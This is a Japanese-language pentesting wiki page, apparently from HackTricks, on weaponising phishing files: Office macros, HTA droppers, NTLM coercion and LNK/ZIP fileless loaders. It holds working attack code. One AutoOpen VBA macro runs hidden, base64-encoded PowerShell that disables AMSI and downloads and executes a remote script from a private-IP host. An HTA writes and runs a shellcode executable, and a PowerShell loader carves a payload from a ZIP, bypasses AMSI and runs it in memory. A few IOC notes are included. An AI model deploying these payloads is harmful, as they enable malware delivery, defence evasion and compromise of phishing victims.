# フィッシング ファイル & ドキュメント

{{#include ../../banners/hacktricks-training.md}}

## Office ドキュメント

Microsoft Word は、ファイルを開く前にファイルのデータ検証を行います。データ検証は、OfficeOpenXML 標準に従ったデータ構造の識別の形で行われます。データ構造の識別中にエラーが発生した場合、解析中のファイルは開かれません。

通常、マクロを含む Word ファイルは `.docm` 拡張子を使用します。しかし、ファイル拡張子を変更してファイル名を変えても、マクロ実行機能を維持することが可能です。\
例えば、RTF ファイルは設計上マクロをサポートしませんが、DOCM ファイルを RTF にリネームすると Microsoft Word によって扱われ、マクロを実行可能になります。\
同じ内部構造とメカニズムは Microsoft Office Suite (Excel, PowerPoint など) のすべてのソフトウェアに適用されます。

以下のコマンドを使って、いくつかの Office プログラムで実行される拡張子を確認できます：
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### External Image Load

Go to: _Insert --> Quick Parts --> Field_\
_**Categories**: リンクと参照、**フィールド名**: includePicture、**ファイル名またはURL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

マクロを使ってドキュメントから任意のコードを実行することが可能です。

#### Autoload functions

一般的であるほど、AVによって検出される確率が高くなります。

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### 手動でメタデータを削除する

「**File > Info > Inspect Document > Inspect Document**」に移動すると、Document Inspector が表示されます。**Inspect** をクリックし、続いて **Document Properties and Personal Information** の横にある **Remove All** をクリックしてください。

#### Doc Extension

完了したら、**Save as type** ドロップダウンを選択し、フォーマットを **`.docx`** から **Word 97-2003 `.doc`** に変更します。\
これは **`.docx`** の中に macro を保存できないことと、macro 有効化の **`.docm`** 拡張子にはスティグマ（例：サムネイルアイコンに大きな `!` が付くため、一部の web/email ゲートウェイが完全にブロックする）があります。したがって、この **レガシーな `.doc` 拡張子が最良の妥協点** です。

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

HTA は HTML とスクリプト言語（VBScript や JScript など）を組み合わせた Windows プログラムです。ユーザーインターフェイスを生成し、ブラウザのセキュリティモデルの制約を受けない「fully trusted」アプリケーションとして実行されます。

HTA は **`mshta.exe`** を使って実行されます。通常これは **Internet Explorer** とともに **installed** されるため、**`mshta` は IE に依存**します。したがって、IE がアンインストールされている場合、HTA は実行できなくなります。
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM 認証の強制

NTLM 認証を**「リモートで」強制する**方法はいくつかあります。たとえば、ユーザがアクセスするメールや HTML に**不可視の画像**を追加する（HTTP MitM? でも）。また、被害者に**ファイルのアドレス**を送り、フォルダを**開くだけで****認証を****トリガー**するようなものを送ることもできます。

**以下のページでこれらのアイデアやその他を確認してください：**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

ハッシュや認証を盗むだけでなく、**NTLM relay attacks**も実行できることを忘れないでください：

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

非常に効果的なキャンペーンは、2つの正当なデコイドキュメント（PDF/DOCX）と悪意のある .lnk を含む ZIP を配布します。トリックは、実際の PowerShell ローダーが一意のマーカーの後に ZIP の生バイト内に格納されており、.lnk がそれを切り出してメモリ上で完全に実行する点にあります。

Typical flow implemented by the .lnk PowerShell one-liner:

1) Desktop、Downloads、Documents、%TEMP%、%ProgramData%、およびカレントワーキングディレクトリの親などの一般的なパスで元の ZIP を検索する。  
2) ZIP のバイトを読み取り、ハードコードされたマーカー（例: xFIQCV）を探す。マーカー以降のすべてが埋め込まれた PowerShell ペイロードである。  
3) ZIP を %ProgramData% にコピーし、そこで展開し、正当らしく見せるためにデコイの .docx を開く。  
4) 現在のプロセスで AMSI をバイパスする: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) 次のステージの難読化を解除（例: 全ての # 文字を削除）してメモリ上で実行する。

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
注記
- 配信はしばしば信頼された PaaS サブドメイン（例: *.herokuapp.com）を悪用し、ペイロードを制限して IP/UA に基づき無害な ZIP を返すことがある。
- 次段階では base64/XOR の shellcode を復号し、ディスク痕跡を最小化するために Reflection.Emit + VirtualAlloc 経由で実行することが多い。

Persistence used in the same chain
- Microsoft Web Browser control の COM TypeLib hijacking により、IE/Explorer やそれを埋め込んだ任意のアプリが payload を自動的に再実行するようにする。詳細とすぐに使えるコマンドは以下を参照：

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- アーカイブデータ末尾に ASCII マーカー文字列（例: xFIQCV）が付加された ZIP ファイル。
- ZIP を探すために親/ユーザフォルダを列挙し、デコイ文書を開く .lnk。
- [System.Management.Automation.AmsiUtils]::amsiInitFailed を使った AMSI 改ざん。
- 信頼された PaaS ドメインでホストされたリンクで終わる長時間実行されるビジネススレッド。

## NTLM ハッシュを窃取するための Windows ファイル

次のページを確認: **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
